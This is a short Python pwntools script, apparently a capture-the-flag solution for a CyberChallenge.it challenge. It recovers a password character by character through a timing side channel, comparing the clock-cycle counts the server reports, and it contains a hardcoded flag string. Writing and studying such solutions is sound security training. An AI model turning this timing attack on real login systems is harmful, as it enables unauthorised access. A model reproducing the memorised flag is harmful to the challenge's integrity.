from pwn import*
conn = remote("benchmark.challs.cyberchallenge.it", 9031)
flag= "CCIT{s1d3_ch4nn3ls_r_c00l}"
for y in range(20):

	flagdue=flag
	tempo=b"0"
	tempovecchio=b"0"
	carattere=""
	print(conn.recvuntil(b"check:\n"))
	for x in range(32,126):
		flagdue=flag
		flagdue=str(flagdue)+chr(x)
		
		flagdue=flagdue+"\n"
		flagdue=flagdue.encode()
		conn.send(flagdue)
		
		conn.recvuntil("Wrong password, checked in ")	
		tempo=conn.recvuntil(b"cycles\n")
		tempo=tempo.replace(b" clock cycles\n",b"")
		print(tempo)
		if(tempovecchio<tempo):
			print(tempo)
			tempovecchio=tempo
			carattere=chr(x)
		
	print(tempovecchio)
	print(ord(carattere))
	flag=flag+carattere
	print(flag)
	
print(flag)

print(conn.recvuntil(b"check:\n"))
